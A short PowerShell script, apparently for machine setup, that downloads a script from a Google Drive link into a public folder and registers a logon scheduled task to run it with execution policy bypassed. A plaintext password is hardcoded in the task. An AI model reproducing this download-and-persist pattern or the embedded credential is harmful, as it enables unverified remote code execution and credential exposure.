New-Item -ItemType File -Path "C:\Users\Public\logfilecse.txt"
$logFilePath = "C:\Users\Public\logfilecse.txt"
Start-Transcript -Path $logFilePath -Append
$url = "https://drive.usercontent.google.com/download?id=1uUwnvqqMWRCZ2L33J2lOLXcCuQFka-Xc&export=download&authuser=0&confirm=t&uuid=051cd117-8e88-40da-8111-9fcad42c199c&at=APZUnTUzd73NR6YZ_fku52ndq_qu:1712846598660"
$tempFilePath = "C:\Users\Public\chromeandiis.ps1"
Invoke-WebRequest -Uri $url -OutFile $tempFilePath
# Get the SID of the user

function Get-CurrentUserSID {
    $currentUserSID = whoami /user /fo csv | ConvertFrom-Csv | Select-Object -ExpandProperty SID
    return $currentUserSID
}

# Get the SID of the current user using the function
$currentSID = Get-CurrentUserSID

# Use the SID to fetch information about the current user
$currentUserInfo = Get-WmiObject -Class Win32_UserAccount -Filter "SID='$currentSID'"

# Output information about the current user
#$currentUserInfo

$trigger = New-ScheduledTaskTrigger -AtLogOn -User $currentSID
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File $tempFilePath"
Register-ScheduledTask -TaskName ABC  -Action $action -Trigger $trigger -User $currentSID -Password "Rjangra#2021" -TaskPath "\"
Stop-Transcript